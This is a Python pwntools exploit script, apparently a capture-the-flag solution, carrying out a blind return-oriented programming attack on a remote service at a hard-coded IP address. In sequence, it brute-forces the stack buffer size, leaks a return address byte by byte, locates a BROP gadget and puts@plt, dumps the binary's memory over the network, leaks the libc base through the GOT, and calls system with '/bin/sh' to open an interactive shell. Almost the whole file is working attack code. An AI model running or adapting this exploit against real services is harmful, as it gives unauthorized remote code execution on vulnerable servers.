#!/usr/bin/env python3

from pwn import *
import sys
from os.path import exists

HOST = '34.159.129.6'
PORT = 30550
libc = ELF('./libc-2.23.so', checksec=False)

def check_offset(offset):
    payload = b'A' * (offset -1)
    try:
        p = remote(HOST, PORT)
        p.recvline()
        p.send(payload)
        p.recv()
        p.close()
        return True
    except EOFError:
        return False
    except Exception as e:
        print(e)
        return False

def get_buffer_size():
     for i in range(100):
        payload  = "A"
        payload += "A"*i
        buf_size = len(payload) - 1
        try:
            p = remote(HOST, PORT)
            p.recvline()
            p.send(payload)
            p.recv()
            p.close()
            log.info("bad: %d" % buf_size)
        except EOFError as e:
            p.close()
            log.info("buffer size: %d" % buf_size)
            return buf_size

def stack_address_leak(buf_size):
    context.log_level = 'error'
    my_list = []
    ret_Addr = ''
    guess = 0x0
    base = ''
    while len(my_list) < 8:
        guess = 0x0
        while guess != 0xff:
            sleep(0.1)
            payload  = "A"*buf_size
            if guess == 0xa:
                guess += 1
            payload = payload + ''.join(ret_Addr) + chr(guess)
            try:
                p = remote(HOST,PORT)
                p.recvline()
                p.send(payload)
                line = p.recv(30, timeout=2)
                if "No password" in line.decode():
                    ret_Addr += chr(guess)
                    my_list.append(guess)
                    #print("Return addrees:" + ret_Addr)
                    guess = 0x0
                    p.close()
                    break
                else:
                    guess += 1
                    p.close()
            except EOFError as e:
                p.close()
                #print("bad: 0x%x" % guess)
                guess += 1
            except KeyboardInterrupt:
                sys.exit(-2)
            except:
                log.info("Can't connect")
                guess -= 1
    return ret_Addr

def check_Brop_Gadget(buff_size, addr):
    payload = b'A' * buff_size + p64(addr) + (b'B' *8) * 10
    try:
        io = remote(HOST, PORT)
        io.recvline()
        io.sendline(payload)
        content = io.recv()
        return False
    except EOFError:
        return True
    except Exception as e:
        print(e)
        print('Connection Died')
        return False


def get_Brop_Gadget(stop_gadget, buff_size):
    context.log_level = 'error'
    addr = stop_gadget
    while True:
        sleep(0.1)
        addr += 1

        payload = b'A' * buff_size + p64(addr) + p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6) + p64(stop_gadget)
        try:
            p = remote(HOST,PORT)
            p.recvline()
            p.send(payload)
            line = p.recv(30, timeout=2)
            if b"No password" in line:
                if check_Brop_Gadget(buff_size, addr):
                    #print('Brop Gadget : ' + hex(addr))
                    p.close()
                    return addr
                else:
                    raise EOFError
            else:
                raise EOFError
        except EOFError as e:
                p.close()
                #print("bad: 0x%x" % addr)
        except Exception as e:
            print(e)
            print('Can\'t Connect')
            addr -= 1

def get_puts_addr(buff_size, stop_gadget, brop_Gadget):
    context.log_level = 'error'
    addr = stop_gadget - 512
    addr -= addr % 16 # Aligning the address
    pop_rdi = brop_Gadget + 9 # Getting pop rdi by misalignment
    junk = b'A' * buff_size

    while True:
        payload = junk + p64(pop_rdi) + p64(0x400000) + p64(addr)
        try:
            io = remote(HOST, PORT)
            io.recvline()
            io.sendline(payload)
            content = io.recv()
            if b'\x7fELF' in content:
                print(content)
                return addr
            else:
                raise EOFError
        except EOFError as e:
            #print('Bad address: %x' % addr)
            addr += 0x10
            io.close()
        except KeyboardInterrupt:
            sys.exit(-1)
        except Exception as e:
            print(e)

def dump_memory(buf_size, stop_gadget, brop_Gadget, puts_plt, start_addr=0x400000, end_addr=0x400800):
    context.log_level = 'error'
    pop_rdi_ret = brop_Gadget + 9

    result = b''
    while start_addr < end_addr:
        sleep(1)
        payload = b'a' * buf_size
        payload += p64(pop_rdi_ret)
        payload += p64(start_addr)
        payload += p64(puts_plt)

        try:
            r = remote(HOST, PORT)
            r.recvline()
            r.sendline(payload)
            resp = r.recv(timeout=1)

            if resp == b'\n':
                resp = b'\x00'
            elif resp[-1] == 0xa:
                resp = resp[:-1]
            elif resp == b'':
                resp = b'\x00'

            print('Leaking: 0x%x' % start_addr)
            result += resp
            start_addr += len(resp)
            r.close()
        except Exception as e:
            print(e)
            log.info("connect error")

    return result

def get_shell(buf_size, brop_Gadget, main_puts, got_Addr, main_start_address):
    pop_rdi = brop_Gadget +9
    payload = b'A' * buff_size + p64(pop_rdi) + p64(got_Addr) + p64(main_puts) + p64(main_start_address)
    print(payload)
    try:
        p = remote(HOST, PORT)
        p.recvline()
        #p.sendline()
        p.send(payload)
        data = p.recv()
        #print(data)
        leak = u64(data[:-1].ljust(8, b'\x00'))
        #print(hex(leak))
        libc.address = leak - libc.symbols['puts']
        print("Libc base address: 0x%x" % libc.address)
        binsh = libc.address + 0x18ce57
        payload2 = b'A' * buf_size + p64(pop_rdi) + p64(binsh) + p64(libc.symbols['system'])
        p.send(payload2)
        p.interactive()
    except Exception as e:
        print(e)


context.log_level = 'error'
#buff_size = get_buffer_size()
buff_size = 88
print("Buffer size: 0x%x" % buff_size)
#stop_gadget = u64(stack_address_leak(buff_size))
stop_gadget = 0x40070c
print("Stop Gadget: 0x%x" % stop_gadget)
#brop_Gadget = get_Brop_Gadget(stop_gadget, buff_size)
brop_Gadget = 0x4007ba
print("Brop Gadget: 0x%x" % brop_Gadget)
#puts_plt = get_puts_addr(buff_size, stop_gadget, brop_Gadget)
puts_plt = 0x400560
print("Puts addr: 0x%x" % puts_plt)

if not exists('./blind.dump'):
    data = dump_memory(buff_size, stop_gadget, brop_Gadget, puts_plt)
    with open('blind.dump', 'wb') as f:
        f.write(data)

# CHECK bling.dump and you will easily find these addresses
puts_gadget = 0x4006fb
got_Addr = 0x601018
main_start_address = 0x004006b6

get_shell(buff_size, brop_Gadget, puts_gadget, got_Addr, main_start_address)
